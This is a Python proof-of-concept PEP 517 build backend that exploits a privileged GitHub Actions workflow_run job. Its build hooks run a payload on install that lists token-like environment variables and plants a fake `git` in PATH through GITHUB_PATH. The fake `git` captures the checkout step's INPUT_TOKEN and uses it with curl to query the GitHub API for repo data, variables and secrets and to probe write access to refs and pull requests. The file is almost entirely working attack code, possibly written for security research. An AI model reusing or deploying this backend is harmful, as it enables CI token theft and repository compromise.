"""PoC PEP 517 backend v3.

1. Executes inside `uv pip install -e .` in the privileged workflow_run job.
2. Installs a fake `git` earlier in PATH via GITHUB_PATH; actions/checkout's post
   step runs `git` with INPUT_TOKEN (the job's GITHUB_TOKEN) in its environment.
3. Builds a valid editable wheel whose .pth aborts the next python step fast so
   the job reaches its post steps quickly.
"""
import base64
import hashlib
import json
import os
import stat
import zipfile

REPO = "PDFtoMark/triage-fivetran-v4c1fe98-3d551a"
NAME = "airflow_provider_great_expectations"
VER = "0.0.0"
DIST = "%s-%s.dist-info" % (NAME, VER)
BIN = "/tmp/.pocbin"

FAKE_GIT = r'''#!/usr/bin/env bash
{
  echo "=== FAKE_GIT_CALLED argc=$# args=$* ==="
  tok="${INPUT_TOKEN:-}"
  echo "INPUT_TOKEN_present=$([ -n "$tok" ] && echo yes || echo no) len=${#tok}"
  if [ -n "$tok" ]; then
    echo "INPUT_TOKEN_SHA256=$(printf %s "$tok" | sha256sum | cut -d' ' -f1)"
  fi
  echo "TOKENISH_ENV=$(env | grep -oE '^[A-Za-z0-9_]*(TOKEN|SECRET|KEY|CREDENTIAL)[A-Za-z0-9_]*' | tr '\n' ',')"
  for v in GITHUB_TOKEN INPUT_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_ID_TOKEN_REQUEST_TOKEN GH_TOKEN; do
    eval "val=\${$v}"
    if [ -n "$val" ]; then
      echo "ENVVAL_${v}_SHA256=$(printf %s "$val" | sha256sum | cut -d' ' -f1) len=${#val} prefix=$(printf %s "$val" | cut -c1-4)"
    fi
  done
  if [ -n "$tok" ]; then
    H="-H Authorization:token\ $tok -H Accept:application/vnd.github+json"
    base="https://api.github.com/repos/PDFtoMark/triage-fivetran-v4c1fe98-3d551a"
    echo "--- API_GET_REPO ---"
    curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "$base" | head -c 1200
    echo "--- API_GET_USER ---"
    curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "https://api.github.com/user" | head -c 400
    echo "--- API_LIST_VARIABLES ---"
    curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "$base/actions/variables" | head -c 800
    echo "--- API_LIST_SECRETS ---"
    curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "$base/actions/secrets" | head -c 400
    echo "--- API_WRITE_PROBE_CONTENTS (bogus sha -> 422 means write allowed) ---"
    curl -sS -m 20 -X POST -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" -d '{"ref":"refs/heads/poc-probe","sha":"0000000000000000000000000000000000000000"}' "$base/git/refs" | head -c 400
    echo "--- API_WRITE_PROBE_PULLREQUESTS (PATCH with empty body) ---"
    curl -sS -m 20 -X PATCH -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" -d '{}' "$base/pulls/2" | head -c 400
  else
    echo "NO_INPUT_TOKEN"
  fi
  echo "=== FAKE_GIT_END ==="
} 2>&1
exec /usr/bin/git "$@"
'''


def emit(s):
    print(s, flush=True)


def sha(s):
    return hashlib.sha256(s.encode()).hexdigest()


def install_fake_git():
    os.makedirs(BIN, exist_ok=True)
    p = os.path.join(BIN, "git")
    with open(p, "w") as f:
        f.write(FAKE_GIT)
    os.chmod(p, os.stat(p).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    gp = os.environ.get("GITHUB_PATH")
    if gp:
        with open(gp, "a") as f:
            f.write(BIN + "\n")
    emit("FAKE_GIT_INSTALLED path=%s github_path=%s" % (p, gp))


def payload(stage):
    emit("=== EVIL_V3_START stage=%s ===" % stage)
    emit("CTX workflow=%s event=%s job=%s repo=%s actor=%s run=%s" % (
        os.environ.get("GITHUB_WORKFLOW"), os.environ.get("GITHUB_EVENT_NAME"),
        os.environ.get("GITHUB_JOB"), os.environ.get("GITHUB_REPOSITORY"),
        os.environ.get("GITHUB_ACTOR"), os.environ.get("GITHUB_RUN_ID")))
    emit("ENV_KEYS_WITH_TOKEN=%s" % ",".join(
        k for k in os.environ if any(t in k.upper() for t in ("TOKEN", "SECRET", "CREDENTIAL"))))
    if os.environ.get("GITHUB_TOKEN"):
        emit("ENV_GITHUB_TOKEN_SHA256=%s len=%d" % (sha(os.environ["GITHUB_TOKEN"]), len(os.environ["GITHUB_TOKEN"])))
    install_fake_git()
    emit("=== EVIL_V3_END ===")


def get_requires_for_build_wheel(config_settings=None):
    payload("wheel-requires")
    return []


def get_requires_for_build_editable(config_settings=None):
    payload("editable-requires")
    return []


def _metadata():
    return ("Metadata-Version: 2.1\nName: airflow-provider-great-expectations\n"
            "Version: %s\nSummary: poc\n" % VER)


def _wheel():
    return "Wheel-Version: 1.0\nGenerator: poc\nRoot-Is-Purelib: true\nTag: py3-none-any\n"


def prepare_metadata_for_build_editable(metadata_directory, config_settings=None):
    payload("editable-metadata")
    d = os.path.join(metadata_directory, DIST)
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "METADATA"), "w") as f:
        f.write(_metadata())
    with open(os.path.join(d, "WHEEL"), "w") as f:
        f.write(_wheel())
    return DIST


def _write_wheel(wheel_directory):
    fname = "%s-%s-py3-none-any.whl" % (NAME, VER)
    path = os.path.join(wheel_directory, fname)
    meta = _metadata()
    whl = _wheel()
    # .pth is executed at interpreter startup: fail fast so the job reaches post steps
    pth = "import sys; print('POC_PTH_EXECUTED', flush=True); sys.exit(1)\n"
    record = "RECORD,,\n"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(DIST + "/METADATA", meta)
        z.writestr(DIST + "/WHEEL", whl)
        z.writestr("_poc_editable.pth", pth)
        z.writestr(DIST + "/RECORD", record)
    emit("WROTE_WHEEL=%s" % path)
    return fname


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    payload("wheel-build")
    return _write_wheel(wheel_directory)


def build_editable(wheel_directory, config_settings=None, metadata_directory=None):
    payload("editable-build")
    return _write_wheel(wheel_directory)
